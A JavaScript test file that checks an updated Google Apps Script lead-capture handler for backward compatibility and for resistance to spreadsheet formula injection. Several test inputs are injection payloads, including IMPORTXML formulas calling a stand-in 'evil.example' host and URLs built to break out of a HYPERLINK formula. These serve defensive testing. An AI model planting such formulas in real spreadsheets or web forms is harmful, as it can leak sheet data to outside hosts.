// Runs the real Apps Script files against a fake sheet that behaves like Google Sheets where it
// matters: formulas run, an apostrophe stores text, and writing past the last column fails.
import { readFileSync } from 'node:fs';
import vm from 'node:vm';
import { describe, expect, it } from 'vitest';
import { computeScorecard } from '../../src/scorecard/engine/index.ts';
import { sheetAnswerColumns, sheetResultColumns } from '../../src/scorecard/sheetPayload.ts';
import { PATH_A, PATH_B, PATH_C } from '../../src/scorecard/testScriptPaths.ts';

const source = (name) => readFileSync(new URL(name, import.meta.url), 'utf8');
const ORIGINAL = source('./Code.original.gs');
const UPDATED = source('./Code.gs');

function fakeSheet(maxColumns = 26) {
  const cells = new Map();
  const key = (r, c) => `${r},${c}`;
  const sheet = {
    cells,
    maxColumns,
    getLastRow: () => Math.max(1, ...[...cells.keys()].map((k) => Number(k.split(',')[0]))),
    getMaxColumns: () => sheet.maxColumns,
    insertColumnsAfter: (after, count) => {
      if (after !== sheet.maxColumns) throw new Error('insert position must be the last column');
      sheet.maxColumns += count;
    },
    getRange: (row, column, rows = 1) => {
      if (column > sheet.maxColumns) throw new Error('Those columns are out of bounds.');
      const write = (cell) => cells.set(key(row, column), cell);
      return {
        getValue: () => cells.get(key(row, column))?.value ?? '',
        getValues: () => Array.from({ length: rows }, (_, i) => [cells.get(key(row + i, column))?.value ?? '']),
        setFormula: (formula) => write({ value: formula, ran: true }),
        setValue: (value) => {
          // Sheets turns arrays and objects into text before deciding whether it is a formula
          const text = typeof value === 'object' && value !== null ? String(value) : value;
          if (typeof text !== 'string') write({ value: text, ran: false });
          else if (text.startsWith("'")) write({ value: text.slice(1), ran: false });
          else write({ value: text, ran: /^[=+\-@\t\r\n]/.test(text) });
        },
      };
    },
  };
  sheet.getRange(1, 1).setValue('session_id');
  return sheet;
}

function runner(code, sheet) {
  const context = {
    SpreadsheetApp: { getActiveSpreadsheet: () => ({ getSheetByName: (name) => (name === 'Scorecard Leads' ? sheet : null) }) },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: (text) => ({ text, setMimeType() { return this; } }),
    },
  };
  vm.createContext(context);
  vm.runInContext(code, context);
  return (payload) => JSON.parse(context.doPost({ postData: { contents: JSON.stringify(payload) } }).text);
}

const snapshot = (sheet) => Object.fromEntries([...sheet.cells].sort());
const ranFormulas = (sheet) => [...sheet.cells].filter(([, cell]) => cell.ran).map(([k, cell]) => [k, cell.value]);

// Exactly the keys main's App.jsx sends today: a mid-quiz post, then the final post
const mainPartial = {
  session_id: 's_1793000000000_abc123',
  timestamp: '2026-11-05T10:00:00.000Z',
  completed: false,
  q1_challenge: 'Too few qualified leads',
  q2_tried: 'Hired an agency',
  q3_lead_sources: 'Referrals, Paid ads',
  q4_marketing_spend: '$1,000–$5,000',
  q5_cpl_cac: 'I know both',
  q5_cpl_value: '40',
  q5_cac_value: '300',
  q6_who_sells: 'The owner',
  q7_follow_up_speed: 'Same day',
  q8_sales_process: 'Somewhat defined',
  q8b_deals_closed_90d: '11–25',
  q9_conversion_rate: '10–20%',
  q9_conversion_value: '15',
  q10_deal_falloff: 'After the quote, Never hear back',
  q11_crm: 'Yes, used daily',
  q12_business_type: 'HVAC',
  q13_years: '5–10 years',
  q14_revenue: '$1M–$5M',
  q15_deal_size: '$5,000–$10,000',
};
const mainFinal = {
  ...mainPartial,
  timestamp: '2026-11-05T10:03:00.000Z',
  completed: true,
  first_name: 'Sam',
  email: 'sam@example.com',
  company: 'Great Install LLC',
  score: 0,
  report_url: 'https://scorecard.parkridgeadvisory.com/?r=1&score=62&nm=Sam&em=sam%40example.com&co=Great+Install',
};

// Exactly the keys InsuranceApp.jsx sends today: several have no column and are dropped
const insuranceFinal = {
  session_id: 's_1793000000001_def456',
  timestamp: '2026-11-05T11:00:00.000Z',
  completed: true,
  industry: 'Insurance',
  q1_challenge: 'Retention',
  q2_tried: 'A new AMS',
  q3_lead_sources: 'Referrals',
  q4_marketing_spend: 'Under $1,000',
  q5_cpq_cac: 'Not sure',
  q5_cpq_value: '12',
  q5_cac_value: '250',
  q6_who_sells: 'Producers',
  q7_follow_up_speed: 'Within an hour',
  q8_sales_process: 'Documented',
  q9_quote_to_bind: '30%',
  q9_qtb_value: '30',
  q10_quote_falloff: 'After the quote',
  q11_ams_use: 'Daily',
  q12_retention: '85%',
  q12_retention_value: '85',
  q13_policies_per_household: '2',
  q14_agency_model: 'Independent',
  q15_primary_lines: 'Auto, Home',
  q16_revenue: '$1M–$5M',
  first_name: 'Pat',
  email: 'pat@example.com',
  company: 'Summit Farmers Agency',
  score: 71,
  report_url: 'https://scorecard.parkridgeadvisory.com/insurance?r=1&score=71&nm=Pat',
};

const v2Final = (answers, overrides = {}) => ({
  session_id: 'test_s_1793000000002_ghi789',
  timestamp: '2026-11-05T12:00:00.000Z',
  completed: true,
  first_name: 'Sam',
  email: 'test+a@example.com',
  company: 'Great Install LLC',
  score: computeScorecard(answers, 'general').overallScore,
  is_test: true,
  ...sheetAnswerColumns(answers),
  ...sheetResultColumns(computeScorecard(answers, 'general')),
  ...overrides,
});

describe('the fake sheet is a fair test', () => {
  it('shows the original script running injected formulas', () => {
    const sheet = fakeSheet();
    runner(ORIGINAL, sheet)({ session_id: 's_1', first_name: '=IMPORTXML("http://evil.example")', report_url: 'x") & "' });
    expect(ranFormulas(sheet).map(([k]) => k).sort()).toEqual(['2,26', '2,4']);
  });
});

describe('backward compatibility with what production sends today', () => {
  const scenarios = {
    'main: mid-quiz post': [mainPartial],
    'main: mid-quiz then final, same row': [mainPartial, mainFinal],
    'insurance: final post': [insuranceFinal],
    'two leads on separate rows': [mainFinal, insuranceFinal],
    'a post with no session id': [{ timestamp: 't', first_name: 'NoSession' }],
    'score of 0 and completed false are still written': [{ session_id: 's_z', score: 0, completed: false }],
  };

  it.each(Object.entries(scenarios))('%s: identical to the original script', (_, posts) => {
    const before = fakeSheet();
    const after = fakeSheet();
    const runOriginal = runner(ORIGINAL, before);
    const runUpdated = runner(UPDATED, after);
    for (const post of posts) expect(runUpdated(post)).toEqual(runOriginal(post));
    expect(snapshot(after)).toEqual(snapshot(before));
  });

  it('old-format posts never touch the columns past Z', () => {
    const sheet = fakeSheet();
    runner(UPDATED, sheet)(mainFinal);
    runner(UPDATED, sheet)(insuranceFinal);
    expect(sheet.maxColumns).toBe(26);
  });

  it('keeps the report link working on production URLs, including /insurance', () => {
    const sheet = fakeSheet();
    runner(UPDATED, sheet)(insuranceFinal);
    expect(sheet.cells.get('2,26')).toEqual({ value: `=HYPERLINK("${insuranceFinal.report_url}","View Report")`, ran: true });
  });
});

describe('formula injection', () => {
  it.each(['=1+1', '+1+1', '-1+1', '@SUM(A1)', '\t=1+1', '\r=1+1', '\n=1+1', '=IMPORTXML("http://evil.example","//a")'])(
    'stores %j as plain text',
    (value) => {
      const sheet = fakeSheet();
      runner(UPDATED, sheet)({ session_id: 's_1', first_name: value, q1_challenge: value });
      expect(ranFormulas(sheet)).toEqual([]);
      expect(sheet.cells.get('2,4')).toEqual({ value, ran: false });
    },
  );

  it('covers every column, old and v2', () => {
    const evil = '=EVIL()';
    const keys = [
      'timestamp', 'first_name', 'email', 'company', 'score', 'completed', 'q1_challenge', 'q2_tried', 'q3_lead_sources', 'q4_lead_volume',
      'q5_cpl_cac', 'q5_cpl_value', 'q5_cac_value', 'q6_who_sells', 'q7_follow_up_speed', 'q8_sales_process', 'q9_conversion_rate',
      'q9_conversion_value', 'q10_deal_falloff', 'q11_crm', 'q12_business_type', 'q13_years', 'q14_revenue', 'q15_deal_size', 'report_url',
      'challenges', 'challenges_other', 'lead_channels', 'monthly_leads', 'response_speed', 'follow_up_attempts', 'close_rate', 'customer_value',
      'old_leads', 'lead_tracking', 'ai_level', 'time_sinks', 'estimate_kind', 'monthly_low', 'monthly_high', 'yearly_low', 'yearly_high',
      'hours_low', 'hours_high', 'top_leak', 'ai_level_number', 'band', 'survey_version', 'snapshot_url', 'is_test',
    ];
    const sheet = fakeSheet();
    runner(UPDATED, sheet)({ session_id: evil, ...Object.fromEntries(keys.map((k) => [k, evil])) });
    expect(ranFormulas(sheet)).toEqual([]);
    expect([...sheet.cells.keys()].filter((k) => k.startsWith('2,')).length).toBe(51);
  });

  it.each([[['=1+1']], [{ a: '=1+1' }], [[['=1+1']]]])('stores the non-string value %j as text', (value) => {
    const sheet = fakeSheet();
    runner(UPDATED, sheet)({ session_id: 's_1', first_name: value, challenges: value });
    expect(ranFormulas(sheet)).toEqual([]);
  });

  it('still finds a row whose session id had to be neutralized', () => {
    const sheet = fakeSheet();
    const run = runner(UPDATED, sheet);
    expect(run({ session_id: '=abc', first_name: 'One' }).row).toBe(2);
    expect(run({ session_id: '=abc', first_name: 'Two' }).row).toBe(2);
  });

  it('leaves ordinary text and numbers untouched', () => {
    const sheet = fakeSheet();
    runner(UPDATED, sheet)({ session_id: 's_1', first_name: "O'Brien", q1_challenge: '2–3 times', score: -5 });
    expect(sheet.cells.get('2,4').value).toBe("O'Brien");
    expect(sheet.cells.get('2,8').value).toBe('2–3 times');
    expect(sheet.cells.get('2,7').value).toBe(-5);
  });
});

describe('the report link', () => {
  const linkFor = (url) => {
    const sheet = fakeSheet();
    runner(UPDATED, sheet)({ session_id: 's_1', report_url: url });
    return sheet.cells.get('2,26');
  };

  it('escapes quotes so a URL cannot break out of the formula', () => {
    const url = 'https://scorecard.parkridgeadvisory.com/?x=","y") & IMPORTXML("http://evil.example","//a") & HYPERLINK("';
    expect(linkFor(url).value).toBe(`=HYPERLINK("${url.replace(/"/g, '""')}","View Report")`);
  });

  it.each([
    'https://evil.example/',
    'https://scorecard.parkridgeadvisory.com.evil.example/',
    'http://scorecard.parkridgeadvisory.com/',
    'x") & IMPORTXML("http://evil.example","//a") & HYPERLINK("',
    '=IMPORTXML("http://evil.example","//a")',
    'https://parkridge-scorecard-abc-tom-8931s-projects.vercel.app/?r=1',
  ])('writes %s as plain text with no formula', (url) => {
    expect(linkFor(url)).toEqual({ value: url, ran: false });
  });

  it('never builds a formula from a non-string', () => {
    expect(linkFor(['https://scorecard.parkridgeadvisory.com/']).ran).toBe(false);
  });
});

describe('v2 posts', () => {
  const column = (sheet, row, key) => {
    const headers = [...sheet.cells].find(([k, cell]) => k.startsWith('1,') && cell.value === key);
    return sheet.cells.get(`${row},${headers[0].split(',')[1]}`)?.value;
  };

  it('adds the missing columns instead of failing on a sheet that stops at Z', () => {
    const sheet = fakeSheet(26);
    expect(() => runner(UPDATED, sheet)(v2Final(PATH_A))).not.toThrow();
    expect(sheet.maxColumns).toBe(51);
  });

  it('works on a sheet that already has more columns, without inserting any', () => {
    const sheet = fakeSheet(100);
    runner(UPDATED, sheet)(v2Final(PATH_A));
    expect(sheet.maxColumns).toBe(100);
  });

  it('writes headers once and does not overwrite existing ones', () => {
    const sheet = fakeSheet(60);
    sheet.getRange(1, 27).setValue('Tom renamed this');
    const run = runner(UPDATED, sheet);
    run(v2Final(PATH_A));
    run(v2Final(PATH_C, { session_id: 'test_s_1793000000003_jkl' }));
    expect(sheet.cells.get('1,27').value).toBe('Tom renamed this');
    expect(sheet.cells.get('1,28').value).toBe('challenges_other');
    expect(sheet.cells.get('1,51').value).toBe('is_test');
  });

  it('path A: dollars, with readable answers', () => {
    const sheet = fakeSheet();
    runner(UPDATED, sheet)(v2Final(PATH_A));
    expect(column(sheet, 2, 'challenges')).toBe('Not enough leads');
    expect(column(sheet, 2, 'lead_channels')).toBe('Referrals, Paid ads');
    expect(column(sheet, 2, 'monthly_leads')).toBe('25–50');
    expect(column(sheet, 2, 'ai_level')).toBe('Level 2, Regular chat');
    expect(column(sheet, 2, 'time_sinks')).toBe('Follow-up emails, Quotes or proposals, CRM updates and data entry');
    expect(column(sheet, 2, 'estimate_kind')).toBe('dollars');
    expect(column(sheet, 2, 'monthly_low')).toBe(2600);
    expect(column(sheet, 2, 'monthly_high')).toBe(5200);
    expect(column(sheet, 2, 'yearly_high')).toBe(62400);
    expect(column(sheet, 2, 'top_leak')).toBe('slow_response');
    expect(column(sheet, 2, 'ai_level_number')).toBe(2);
    expect(column(sheet, 2, 'band')).toBe('leaking_revenue');
    expect(column(sheet, 2, 'survey_version')).toBe('general');
    expect(column(sheet, 2, 'is_test')).toBe(true);
    expect(sheet.cells.get('2,7').value).toBe(30);
  });

  it('path B: hours, with AI level 0 style zeros and false still written', () => {
    const sheet = fakeSheet();
    runner(UPDATED, sheet)(v2Final(PATH_B, { is_test: false, ai_level_number: 0 }));
    expect(column(sheet, 2, 'estimate_kind')).toBe('hours');
    expect(column(sheet, 2, 'hours_low')).toBe(6);
    expect(column(sheet, 2, 'hours_high')).toBe(10);
    expect(column(sheet, 2, 'monthly_low')).toBeUndefined();
    expect(column(sheet, 2, 'top_leak')).toBe('none');
    expect(column(sheet, 2, 'is_test')).toBe(false);
    expect(column(sheet, 2, 'ai_level_number')).toBe(0);
  });

  it('path C: hidden', () => {
    const sheet = fakeSheet();
    runner(UPDATED, sheet)(v2Final(PATH_C));
    expect(column(sheet, 2, 'estimate_kind')).toBe('hidden');
    expect(column(sheet, 2, 'monthly_high')).toBe(500);
  });

  it('writes the snapshot link as plain text, not a formula', () => {
    const sheet = fakeSheet();
    const url = 'https://scorecard.parkridgeadvisory.com/results/abc';
    runner(UPDATED, sheet)(v2Final(PATH_A, { snapshot_url: url }));
    expect(column(sheet, 2, 'snapshot_url')).toBe(url);
    expect(ranFormulas(sheet)).toEqual([]);
  });

  it('a mid-quiz post then the final post land on one row', () => {
    const sheet = fakeSheet();
    const run = runner(UPDATED, sheet);
    const session_id = 'test_s_1793000000004_mno';
    run({ session_id, timestamp: 't1', completed: false, is_test: true, ...sheetAnswerColumns({ challenges: ['not_enough_leads'] }) });
    expect(run(v2Final(PATH_A, { session_id })).row).toBe(2);
    expect(sheet.getLastRow()).toBe(2);
    expect(column(sheet, 2, 'challenges')).toBe('Not enough leads');
    expect(column(sheet, 2, 'top_leak')).toBe('slow_response');
  });

  it('old and v2 rows sit side by side, with old columns unchanged by v2 posts', () => {
    const sheet = fakeSheet();
    const run = runner(UPDATED, sheet);
    run(mainFinal);
    const before = sheet.cells.get('2,26');
    run(v2Final(PATH_A));
    expect(sheet.cells.get('2,26')).toEqual(before);
    expect(sheet.cells.get('2,27')).toBeUndefined();
  });
});
